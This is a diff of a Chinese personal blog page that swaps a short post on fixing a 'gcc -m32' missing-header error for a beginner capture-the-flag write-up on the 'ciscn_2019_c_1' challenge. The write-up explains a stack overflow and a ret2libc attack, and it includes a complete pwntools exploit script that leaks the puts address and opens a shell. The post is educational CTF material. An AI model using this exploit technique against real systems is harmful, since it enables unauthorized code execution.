@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>解决gcc -m32报错fatal error syscdefs.h No such file or directory | 2st&#39;s Blog</title>
-  <meta name="keywords" content=" gcc ">
-  <meta name="description" content="解决gcc -m32报错fatal error syscdefs.h No such file or directory | 2st&#39;s Blog">
+  <title>cisc_2019_c_1 | 2st&#39;s Blog</title>
+  <meta name="keywords" content=" ROP ">
+  <meta name="description" content="cisc_2019_c_1 | 2st&#39;s Blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="做pwn有的时候需要加载题目给的libc让程序跑，不然payload是对的远程依旧打不穿 123p = process([&amp;apos;.&#x2F;bin&amp;apos;],env=&amp;#123;&amp;quot;LD_PRELOAD&amp;quot;:&amp;quot;.&#x2F;libc-2.23.so&amp;quot;&amp;#125;)#来加载，其中[&amp;apos;.&#x2F;bin&amp;apos;]替换为你需要调试的二进制文件名，&amp;quot;.&#x2F;libc">
 <meta name="keywords" content="pwntools">
@@ -449,9 +449,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-解决gcc -m32报错fatal error syscdefs.h No such file or directory" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-cisc_2019_c_1" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">解决gcc -m32报错fatal error syscdefs.h No such file or directory</h1>
+        <h1 class="article-title">cisc_2019_c_1</h1>
     
     <div class="article-meta">
         
@@ -459,26 +459,26 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="Linux">Linux</a>
+                <a href="javascript:" data-rel="Pwn">Pwn</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color4">gcc</a>
+            <a href="javascript:" class="color4">ROP</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-30 11:04:21'>2020-01-30 11:04</time>
+        创建时间:<time class="date" title='更新时间: 2020-02-07 21:12:13'>2020-02-07 21:12</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:65</span>
+        <span>字数:343</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -497,7 +497,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#解决方案"><span class="toc-text">解决方案</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -513,10 +513,18 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>做pwn的时候要在64位机子上编译调试32位的程序，如果缺少一些库就会报错，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32报错fatal error syscdefs.h No such file or directory</span><br></pre></td></tr></table></figure>
-
-<h5 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get purge libc6-dev</span><br><span class="line">sudo apt-get install libc6-dev</span><br><span class="line">sudo apt-get install libc6-dev-i386</span><br></pre></td></tr></table></figure>
+        <p>入门Pwn的一道题，利用了构造ROP链和泄露libc地址getshell，对于新手来说比较全面，简单记录一下</p>
+<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_153500.png" alt=""></p>
+<p>先检查程序开的保护，开了NX，不能往buf里填shellcode了，没有canary，放心溢出</p>
+<p>看一下程序的流程</p>
+<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_153944.png" alt=""></p>
+<p>简单分析一下，溢出点只能在encrypt里</p>
+<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_154206.png" alt=""></p>
+<p>s和rbp的距离为0x50，那么只需要在覆盖之后利用调用过的puts函数，将puts的真实地址泄露出来，再利用libc.so或者LibcSearcher莽出system和/bin/sh的地址就可以getshell了。泄露之后要让程序再执行一遍gets，这里我选择让他返回encrypt函数。</p>
+<p>由于是64位的程序，所以要把GOT表中puts的地址放入rdi中，所以需要一个pop rdi的gadget</p>
+<p><img src="http://23.91.100.118:8080/images/2020/02/05/2020-02-05_155647.png" alt=""></p>
+<p>至此，可以写出exp了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//ciscn_2019_1_exp.py</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(&apos;./ciscn_2019_c_1&apos;)</span><br><span class="line">ciscn=ELF(&apos;./ciscn_2019_c_1&apos;)</span><br><span class="line"></span><br><span class="line">puts_plt=ciscn.plt[&apos;puts&apos;]</span><br><span class="line">puts_got=ciscn.got[&apos;puts&apos;]</span><br><span class="line">encrypt = ciscn.symbols[&apos;encrypt&apos;]</span><br><span class="line">pop_rdi=0x400c83</span><br><span class="line"></span><br><span class="line">payload =&apos;A&apos; * 0x58+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class="line">sh.recvuntil(&apos;Input your choice!\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Input your Plaintext to be encrypted\n&apos;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;@\n&apos;)</span><br><span class="line">puts_addr=u64(sh.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc=LibcSearcher(&apos;puts&apos;, puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(&apos;puts&apos;)</span><br><span class="line"></span><br><span class="line">system_addr=libcbase+libc.dump(&apos;system&apos;)</span><br><span class="line">binsh_addr=libcbase+0x18cd57</span><br><span class="line"></span><br><span class="line">payload =&apos;A&apos;*0x58+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Input your Plaintext to be encrypted\n&apos;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
       
@@ -527,12 +535,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>解决gcc -m32报错fatal error syscdefs.h No such file or directory</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">65</span></p>
+    <p><span class="copy-title">文章标题:</span>cisc_2019_c_1</p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">343</span></p>
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="2st">2st</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-01-30, 11:04:21</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-30, 11:04:21</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/01/30/%E8%A7%A3%E5%86%B3gcc%20-m32%E6%8A%A5%E9%94%99fatal%20error%20syscdefs.h%20No%20such%20file%20or%20directory/" title="解决gcc -m32报错fatal error syscdefs.h No such file or directory">https://m-ouse.github.io/2020/01/30/%E8%A7%A3%E5%86%B3gcc%20-m32%E6%8A%A5%E9%94%99fatal%20error%20syscdefs.h%20No%20such%20file%20or%20directory/</a>
+    <p><span class="copy-title">发布时间:</span>2020-02-07, 21:12:22</p>
+    <p><span class="copy-title">最后更新:</span>2020-02-07, 21:12:13</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/02/07/cisc_2019_c_1/" title="cisc_2019_c_1">https://m-ouse.github.io/2020/02/07/cisc_2019_c_1/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
